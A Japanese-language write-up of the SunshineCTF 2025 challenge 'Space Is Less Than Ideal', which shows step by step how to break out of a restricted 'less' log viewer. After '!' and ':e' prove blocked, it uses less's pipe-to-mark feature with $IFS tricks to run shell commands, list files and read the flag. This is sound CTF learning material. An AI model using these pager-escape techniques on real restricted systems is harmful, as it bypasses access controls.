# SanshineCTF2025　Space Is Less Than Ideal
## 問題文
I think i did a thing.

I may have accessed a satellite.

I can access the logs anyhow. I can't seem to access anything else.

I know I've seen that type of log viewer before, but something seems... different... about it.

Well you know the expression. Less is more!

socat file:`tty`,raw,echo=0 TCP:chal.sunshinectf.games:(省略)

何かやった気がする。

衛星にアクセスしたかもしれない。

とにかくログにはアクセスできる。それ以外はアクセスできないようだ。

あのタイプのログビューアは見たことあるけど、何かが…違う…気がする。

まあ、あの言葉知ってるだろ？「少ないほど良い！」ってやつだ！

socat file:`tty`,raw,echo=0 TCP:chal.sunshinectf.games:(省略)

## 解法
すぐに表示が消えるのでキャプチャしながら動かす

アクセスするとつぎのような画面になる

access logsを開くとこのような画面になる。

これはlessというUnix/Linuxで広く使われているファイル閲覧コマンドで表示されたものである。lessには内部で他のコマンドを実行できる機能があり、それを使用して解く。

まずはシェルコマンド実行を試す。
!を押すと実行できるようになる
```
!ls -la
This account is not available

!done  (press RETURN)
```
この方法では無理らしい

次にファイルブラウザ機能を使ってみる
```
:e
```
と打つと
```
Examine: 
```
と表示されるので、それを使用してみる
```
:e .
This: No such file or directory  (press RETURN)
```
:eも封じられているっぽい

|を使用した方法を試す。
```
|'' a
```
で''のコマンドを実行するように（エラーを吐かせるように）試してみる。|を押すと
```
|mark:
```
となるので、aキーを入力すると
```
!
```
となる。これに入力する
```
[7mSystem Access Logs (q to quit)[27m[K

[K|mark: 

[K![K''[K''

[Ksh: : Permission denied
```
いけそう
```
ls -la
```
を実行してみる
```
|a'ls$IFS-la'
total 76
dr-xr-xr-x    1 root     root          4096 Sep 27 14:20 .
drwxr-xr-x    1 root     root          4096 Sep 27 16:48 ..
-r-xr-sr-x    1 root     flag-read      18512 Sep 27 14:20 cat-flag
-r-xr-xr-x    1 root     root          1865 Sep 23 20:52 challenge.sh
-r-xr-xr-x    1 root     root         18456 Sep 27 14:20 drop-perms
-r-xr-xr-x    1 root     root            72 Sep 23 20:52 fake-term.sh
-r--r-----    1 root     flag-read       55 Sep 23 20:52 flag.txt
-r--r--r--    1 root     root          5619 Sep 23 20:52 system_logs.txt
```
実行可能ファイルflag-readがあるので実行してみる
```
./cat-flag
[K

[K!./cat-flag

[?1l>[?1049l[23;0;0tsun{省略}
```